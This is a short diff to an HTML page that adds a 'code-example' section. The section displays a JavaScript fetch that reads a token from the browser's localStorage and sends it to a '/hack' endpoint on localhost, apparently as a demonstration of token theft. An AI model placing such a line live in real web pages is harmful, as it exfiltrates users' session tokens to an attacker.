@@ -24,5 +24,13 @@
     <section id="user-messages">
       <ul></ul>
     </section>
+    <section id="code-example">
+      <pre>fetch(`http://localhost:8080/hack?token=${localStorage.getItem('token')}`, {
+  method: 'GET',
+  headers: {
+      'Content-Type': 'application/json',
+    },
+})</pre>
+    </section>
   </body>
 </html>
